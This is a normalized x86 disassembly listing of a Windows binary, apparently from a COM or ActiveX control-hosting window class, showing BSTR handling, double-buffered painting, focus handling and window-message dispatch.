cmp ax cx
sete dl
lea eax [ edx - 0x1 ]
and eax 0x80004005
jmp r-xdata
push eax
push 0x0
call [ SysAllocStringLen@IAT ]
mov edi eax
mov [ ebp - 0x3fc ] edi
test edi edi
jne r-xdata
xor edi edi
mov [ ebp - 0x3fc ] edi
lea esp [ esp ]
mov [ ebp - 0x4 ] 0x0
push edi
call [ SysStringLen@IAT ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_402d00
mov eax [ ebp - 0x404 ]
lea ecx [ eax + eax + 0x2 ]
push ecx
push 0x0
push edi
call memset
mov ecx [ ebp - 0x404 ]
mov edx [ esi ]
add esp 0xc
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ecx + ecx ]
mov ecx [ edx + 0xc ]
push eax
push edi
push esi
call ecx
mov ebx eax
test ebx ebx
jns r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push edi
call [ SysFreeString@IAT ]
mov eax 0x8007000e
jmp r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0xc ]
lea edx [ ebp - 0x400 ]
push edx
push eax
lea eax [ ebp - 0x3f8 ]
push eax
push esi
call ecx
mov eax [ ebp - 0x3fc ]
sub eax [ ebp - 0x400 ]
mov [ ebp - 0x3fc ] eax
jne r-xdata
mov eax 0x3e8
mov edx [ ebp - 0x40c ]
mov [ ebp - 0x3fc ] 0x0
mov [ edx ] edi
mov [ ebp - 0x4 ] 0xffffffff
push 0x0
call [ SysFreeString@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
push edi
call [ SysFreeString@IAT ]
mov eax ebx
jmp r-xdata
cmp eax 0x3e8
jb r-xdata
sub_404380
push ebp
mov ebp esp
push 0xffffffff
push sub_448cfc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ esi + 0x50 ] edi
lea eax [ esi + 0x8 ]
mov [ esi + 0x4 ] edi
mov [ ebp - 0x10 ] eax
mov [ eax + 0xc ] edi
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ ebp - 0x4 ] 0x2
mov eax [ DefWindowProcW@IAT ]
mov [ esi + 0x20 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ esi + 0x38 ]
mov [ ebp - 0x10 ] eax
add eax 0x4
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0x7
lea eax [ esi + 0x54 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0x9
lea eax [ esi + 0x60 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0xb
lea eax [ esi + 0x64 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0xd
lea eax [ esi + 0x68 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0xf
lea eax [ esi + 0x6c ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0x11
lea eax [ esi + 0x70 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0x13
lea eax [ esi + 0x74 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0x15
lea eax [ esi + 0x78 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0x17
lea eax [ esi + 0x7c ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0x19
lea eax [ esi + 0xd8 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0x1b
lea eax [ esi + 0xdc ]
mov [ ebp - 0x14 ] eax
mov [ eax ] edi
mov [ ebp - 0x4 ] 0x1d
mov [ esi + 0xe8 ] edi
mov [ ebp - 0x4 ] 0x1e
mov ecx [ esi + 0xc8 ]
and [ esi + 0x98 ] 0xffffffc0
and ecx 0xfffffffb
or ecx 0x3
push 0x8
mov [ esi + 0xc8 ] ecx
mov [ esi + 0xcc ] edi
call [ GetSysColor@IAT ]
mov edx [ esi + 0xc8 ]
and [ esi + 0x98 ] 0xffffffbf
and edx 0xffffffaf
or edx 0x28
mov [ esi + 0xd0 ] eax
mov [ esi + 0xd4 ] 0x400
mov [ esi + 0x94 ] 0xcdcdcdcd
mov [ esi + 0xe0 ] 0x4
mov [ esi + 0xe4 ] edi
mov [ esi + 0xc8 ] edx
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] 0x1
mov [ esi + 0xc4 ] edi
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_404520
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
cmp [ esi + 0x70 ] 0x0
mov eax [ ebp + 0x8 ]
push ebx
push edi
jne r-xdata
test [ esi + 0x98 ] 0x8
je r-xdata
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x5c ]
push eax
push ecx
call [ BeginPaint@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov [ eax ] 0x0
mov eax [ esi + 0x4 ]
lea edx [ ebp - 0x5c ]
push edx
push eax
call [ BeginPaint@IAT ]
mov edi eax
mov [ ebp - 0x68 ] edi
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
lea edx [ ebp - 0x18 ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0xcc ]
push ecx
call [ CreateSolidBrush@IAT ]
mov edi eax
test edi edi
je r-xdata
mov edx [ esi + 0x4 ]
lea ecx [ ebp - 0x18 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x18 ]
push eax
push ecx
push edi
call [ CreateCompatibleBitmap@IAT ]
mov ebx eax
mov [ ebp - 0x60 ] ebx
test ebx ebx
je r-xdata
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x5c ]
push eax
push ecx
call [ EndPaint@IAT ]
mov eax 0x1
pop edi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
push edi
lea edx [ ebp - 0x18 ]
push edx
push ebx
call [ FillRect@IAT ]
push edi
call [ DeleteObject@IAT ]
mov eax [ esi + 0x4 ]
lea edx [ ebp - 0x5c ]
push edx
push eax
call [ EndPaint@IAT ]
mov eax 0x1
pop edi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
push edi
call [ CreateCompatibleDC@IAT ]
mov edi eax
test edi edi
je r-xdata
push ebx
call [ DeleteObject@IAT ]
push ebx
push edi
call [ SelectObject@IAT ]
mov [ ebp - 0x64 ] eax
test eax eax
je r-xdata
push edi
call [ DeleteDC@IAT ]
mov edx [ esi + 0xcc ]
push edx
call [ CreateSolidBrush@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
push edi
call [ SelectObject@IAT ]
mov ebx [ ebp - 0x60 ]
push ebx
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ FillRect@IAT ]
push ebx
call [ DeleteObject@IAT ]
mov eax [ esi + 0x70 ]
mov edx [ eax ]
push 0x0
push 0x0
lea ecx [ esi + 0xb4 ]
push ecx
push ecx
push edi
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0x1
push eax
mov eax [ edx + 0xc ]
call eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x68 ]
push 0xcc0020
push 0x0
push 0x0
push edi
push ecx
push edx
push 0x0
push 0x0
push eax
call [ BitBlt@IAT ]
sub_4046f0
push ebp
mov ebp esp
mov edx [ esi + 0xb4 ]
movsx eax cx
shr ecx 0x10
push ebx
movsx ecx cx
push edi
mov edi [ esi + 0xb8 ]
add ecx edi
add eax edx
mov [ esi + 0xbc ] eax
mov [ esi + 0xc0 ] ecx
sub ecx edi
lea ebx [ esi + 0xac ]
sub eax edx
lea edi [ esi + 0xa4 ]
mov [ ebx ] eax
mov [ esi + 0xb0 ] ecx
call sub_405800
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax [ esi + 0x74 ]
pop edi
pop ebx
test eax eax
je r-xdata
mov edx [ eax ]
push edi
push 0x1
push eax
mov eax [ edx + 0x44 ]
call eax
test [ esi + 0x98 ] 0x8
je r-xdata
mov edx [ eax ]
lea ecx [ esi + 0xb4 ]
push ecx
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
xor eax eax
pop ebp
retn 0x4
mov ecx [ esi + 0x2c ]
mov edx [ ecx + 0x64 ]
lea eax [ esi + 0x2c ]
push 0x1
push 0x0
push eax
call edx
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
xor eax eax
pop ebp
retn 0x4
sub_4047a0
push ebp
mov ebp esp
push 0xffffffff
push sub_44676a
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
test [ esi + 0xa0 ] 0x4000
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
je r-xdata
or [ esi + 0x98 ] 0x20
test [ esi + 0x98 ] 0x40
jne r-xdata
cmp [ esi + 0x64 ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp + 0x8 ]
call sub_404880
mov eax 0x1
test [ esi + 0x98 ] al
jne r-xdata
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] eax
mov edx [ esi ]
mov eax [ edx + 0x10 ]
call eax
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x64 ]
mov edx [ eax ]
lea edi [ esi + 0xb4 ]
mov esi [ esi + 0x4 ]
push edi
push esi
push 0x0
push ecx
push 0x0
push 0xfffffffb
push eax
mov eax [ edx + 0x2c ]
call eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
jmp r-xdata
sub_404880
push ebp
mov ebp esp
push 0xffffffff
push sub_44672a
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
test [ esi + 0x98 ] 0x8
je r-xdata
test [ esi + 0x98 ] 0x2
jne r-xdata
call [ GetFocus@IAT ]
mov ecx [ esi + 0x4 ]
push eax
push ecx
call [ IsChild@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov ecx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
mov [ edi ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0x4 ]
push 0x5
push edx
call [ GetWindow@IAT ]
push eax
call [ SetFocus@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x64 ]
mov edx [ eax ]
lea ebx [ esi + 0xb4 ]
push ebx
mov ebx [ esi + 0x4 ]
push ebx
push 0x0
push ecx
push 0x0
push 0xfffffffc
push eax
mov eax [ edx + 0x2c ]
call eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_404970
push ebp
mov ebp esp
push ecx
mov ecx [ edx + 0x98 ]
xor eax eax
mov [ ebp - 0x4 ] eax
test cl 0x1
je r-xdata
mov [ esi ] eax
mov esp ebp
pop ebp
retn 0xc
test cl 0x8
je r-xdata
mov ecx [ edx + 0x74 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x24 ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
push ecx
call eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x0
mov esp ebp
pop ebp
retn 0xc
sub_4049c0
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x98 ]
mov [ ebp - 0x4 ] 0x0
test al 0x1
je r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x0
test al 0x8
je r-xdata
mov eax [ ecx + 0x74 ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x10
sub_404a10
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push ecx
mov ecx [ esi + 0x20 ]
push edx
push eax
push ecx
call [ CallWindowProcW@IAT ]
call sub_40a850
mov edx [ ebp + 0x14 ]
mov [ edx ] 0x0
xor eax eax
pop esi
pop ebp
retn 0x10
sub_404a60
push ebp
mov ebp esp
push edi
mov edi eax
cmp edi 0x39
ja r-xdata
cmp edi 0x115
ja r-xdata
je r-xdata
cmp edi 0x132
jb r-xdata
cmp edi 0x114
jae r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
lea eax [ edi - 0x2b ]
cmp eax 0x4
ja r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax 0x1
pop edi
pop ebp
retn 0x8
cmp edi 0x138
jbe r-xdata
mov eax esi
cmp edi 0x4e
je r-xdata
test eax eax
jne r-xdata
jmp [ eax * 4 + jump_table_404b9c ]
cmp edi 0x210
jne r-xdata
mov ecx [ ebx + 0x98 ]
test cl 0x8
je r-xdata
mov eax [ esi ]
jmp r-xdata
cmp edi 0x111
jne r-xdata
cmp [ esi ] 0x1
mov eax [ esi + 0x14 ]
jne r-xdata
cmp [ esi ] 0x1
je r-xdata
mov eax [ esi + 0xc ]
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
push ecx
add edi 0x2000
push edi
push eax
call [ SendMessageW@IAT ]
pop edi
pop ebp
retn 0x8
mov [ ebp + 0xc ] 0x0
test cl 0x1
je r-xdata
test esi esi
je r-xdata
push eax
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebx + 0x4 ]
push eax
push ecx
call [ GetDlgItem@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax cx
dec eax
cmp eax 0x1
jbe r-xdata
mov edx [ eax + 0xc ]
mov ecx [ eax + 0x8 ]
push edx
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0x4 ]
push ecx
mov ecx [ ebx + 0x20 ]
push edx
push eax
push ecx
call [ CallWindowProcW@IAT ]
mov eax [ ebp + 0xc ]
pop edi
pop ebp
retn 0x8
mov eax [ ebx + 0x74 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
jmp r-xdata
mov edx [ ebx + 0x4 ]
shr ecx 0x10
push ecx
push edx
call [ GetDlgItem@IAT ]
jmp r-xdata
mov ecx [ eax ]
lea edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push esi
push edx
add edi 0x2000
push edi
push eax
mov eax [ ecx + 0x24 ]
call eax
sub_404bb0
push ebp
mov ebp esp
push 0xffffffff
push sub_4466f0
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x60 ]
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x14 ]
call eax
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_404c70
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
cmp [ ebp + 0x1c ] 0x0
push ebx
push esi
push edi
mov ebx ecx
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
cmp eax 0x14
jne r-xdata
cmp eax 0xf
jne r-xdata
cmp [ ebx + 0x70 ] 0x0
mov eax 0x1
jne r-xdata
cmp eax 0x5
jne r-xdata
lea edx [ esp + 0xc ]
push edx
mov esi ebx
mov [ esp + 0x10 ] 0x1
call sub_404520
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x1
test eax eax
je r-xdata
xor eax eax
cmp eax 0x21
jne r-xdata
mov edi [ ebp + 0x14 ]
lea edx [ esp + 0xc ]
push edx
mov ecx edi
mov esi ebx
mov [ esp + 0x10 ] 0x1
call sub_4046f0
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x7
jne r-xdata
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x10 ] 0x1
call sub_4047a0
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
je r-xdata
mov eax [ ebx + 0x98 ]
mov esi [ ebp + 0x10 ]
test al 0x8
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebx + 0x98 ]
mov edx eax
shr edx 0x2
and edx eax
test dl 0x8
je r-xdata
mov ecx [ ebp + 0xc ]
add ecx 0xfffffe00
cmp ecx 0xe
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp eax 0x8
jne r-xdata
or [ ebx + 0x98 ] 0x20
test [ ebx + 0x98 ] 0x40
mov [ esp + 0xc ] 0x1
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
cmp eax 0x100
jne r-xdata
and al 0x10
movzx eax al
neg eax
sbb eax eax
and eax 0x3
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ ebp + 0x18 ]
and [ ebx + 0x98 ] 0xffffffdf
mov [ eax ] 0x0
jmp r-xdata
xor ecx ecx
xor eax eax
lea edi [ esp + 0xc ]
mov esi ebx
call sub_404880
mov ecx [ esp + 0xc ]
jmp r-xdata
test [ ebx + 0xc8 ] 0x8
je r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
mov eax ebx
mov [ esp + 0x1c ] 0x1
call sub_404a10
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
jne r-xdata
cmp eax 0x101
jne r-xdata
lea eax [ esp + 0xc ]
push eax
push edi
push esi
push 0x100
cmp eax 0x3
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ esp + 0xc ]
push edx
push eax
mov eax [ ebp + 0xc ]
mov esi edi
mov [ esp + 0x14 ] 0x1
call sub_404a60
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
jne r-xdata
cmp eax 0x102
jne r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
jmp r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
cmp eax 0x200
jne r-xdata
mov edx edi
shr edx 0x10
movsx ecx dx
mov edx [ eax ]
mov edx [ edx + 0x30 ]
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push 0x0
push ecx
movsx ecx di
push ecx
lea ecx [ ebx + 0xb4 ]
push ecx
push 0x1
push eax
call edx
mov eax [ esp + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x10 ]
mov ecx ebx
call eax
mov esi eax
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push esi
call edx
mov eax [ ebp + 0x18 ]
mov [ eax ] esi
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x103
jne r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
jmp r-xdata
mov ecx ebx
mov [ esp + 0x1c ] 0x1
call sub_4049c0
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
je r-xdata
cmp eax 0x202
jne r-xdata
push edi
mov eax esi
push eax
push 0x200
cmp eax 0x37f
jne r-xdata
mov ebx [ ebx + 0x60 ]
test ebx ebx
je r-xdata
cmp eax 0x104
jne r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
jmp r-xdata
cmp eax 0x205
jne r-xdata
push edi
mov edx esi
push edx
push eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
push edi
push ebx
call sub_404bb0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebx ]
mov edx [ ecx + 0x4 ]
push ebx
call edx
cmp eax 0x105
jne r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
jmp r-xdata
cmp eax 0x208
jne r-xdata
push edi
mov edx esi
push edx
push eax
jmp r-xdata
lea esi [ esp + 0x18 ]
mov edx ebx
mov [ esp + 0x18 ] 0x1
call sub_404970
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
je r-xdata
cmp eax 0x107
jne r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
jmp r-xdata
cmp eax 0x201
jne r-xdata
push edi
mov edx esi
push edx
push eax
jmp r-xdata
cmp eax 0x53
jne r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
jmp r-xdata
cmp eax 0x204
jne r-xdata
push edi
mov edx esi
push edx
push eax
jmp r-xdata
cmp eax 0x1f
jne r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
jmp r-xdata
cmp eax 0x207
jne r-xdata
push edi
mov edx esi
push edx
push eax
jmp r-xdata
cmp eax 0x286
jne r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
jmp r-xdata
cmp eax 0x203
jne r-xdata
push edi
mov edx esi
push edx
push eax
jmp r-xdata
cmp eax 0x209
jne r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
mov ecx ebx
mov [ esp + 0x1c ] 0x1
call sub_4049c0
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
je r-xdata
cmp eax 0x206
jne r-xdata
push edi
mov edx esi
push edx
push eax
jmp r-xdata
cmp eax 0x281
jb r-xdata
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
jmp r-xdata
mov eax [ ebp + 0xc ]
lea edx [ esp + 0xc ]
push edx
push edi
push esi
push eax
mov ecx ebx
mov [ esp + 0x1c ] 0x1
call sub_4049c0
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x209
jne r-xdata
push edi
mov edx esi
push edx
push eax
jmp r-xdata
cmp eax 0x2
jne r-xdata
cmp eax 0x291
ja r-xdata
push edi
mov edx esi
push edx
push eax
lea esi [ esp + 0x18 ]
mov edx ebx
mov [ esp + 0x18 ] 0x1
call sub_404970
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
jne r-xdata
sub_4051c0
push ebp
mov ebp esp
push 0xffffffff
push sub_44672a
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push 0x0
push 0x0
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x10
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_405250
push ebp
mov ebp esp
mov edx [ ebp + 0x20 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push 0x0
push edx
mov edx [ ebp + 0x1c ]
push edx
mov edx [ ebp + 0x18 ]
push edx
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
pop ebp
retn 0x1c
sub_405280
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ edi - 0x24 ]
call sub_40a850
mov eax [ edi - 0x20 ]
xor bl bl
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
call [ IsWindow@IAT ]
test eax eax
je r-xdata
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax 0x1
mov eax [ ebp + 0x10 ]
cmp [ edi - 0x20 ] eax
je r-xdata
push 0x507
push 0x0
push 0x0
push eax
call [ RedrawWindow@IAT ]
call sub_405f50
mov ecx [ ebp + 0xc ]
push 0x0
push 0x1
push ecx
call sub_405900
mov [ ebp + 0x10 ] eax
test eax eax
jns r-xdata
mov ebx eax
call sub_405490
shl eax 0x4
xor eax [ esi + 0xc8 ]
mov bl 0x1
and eax 0x10
xor [ esi + 0xc8 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
call sub_40a850
mov edi [ edi - 0x20 ]
test edi edi
je r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x507
push 0x0
push 0x0
push edi
call [ RedrawWindow@IAT ]
test bl bl
je r-xdata
call sub_405f50
sub_405340
push ebp
